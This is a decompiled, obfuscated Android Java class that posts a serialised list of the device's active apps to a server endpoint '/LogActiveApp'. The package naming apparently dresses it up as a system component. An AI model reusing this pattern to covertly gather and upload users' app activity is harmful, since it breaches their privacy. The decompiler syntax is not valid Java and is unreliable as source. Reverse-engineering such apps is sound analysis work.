package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.entity.ActiveApp;
import com.app.system.common.h;
import com.google.gson.f;
import java.io.IOException;
import java.util.List;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class b
  extends a
{
  public b(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, List<ActiveApp> paramList)
  {
    try
    {
      paramContext = new java/lang/StringBuilder;
      paramContext.<init>();
      paramContext.append(this.c);
      paramContext.append("/LogActiveApp");
      paramContext.append('/');
      paramContext.append(this.a);
      paramContext = com.app.system.common.d.a.a.a.a(paramContext.toString(), h.b().a(paramList));
      if (paramContext != null)
      {
        String str = paramContext.body().string();
        paramList = new java/lang/StringBuilder;
        paramList.<init>();
        paramList.append("SendList Result: ");
        paramList.append(paramContext);
        com.security.d.a.d("ProtocolForActiveApp", paramList.toString(), new Object[0]);
        boolean bool = str.equals("1");
        if (bool) {
          return 1;
        }
      }
    }
    catch (IOException paramContext)
    {
      com.security.d.a.a("ProtocolForActiveApp", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/b.class
 *
 * Reversed by:           J
 */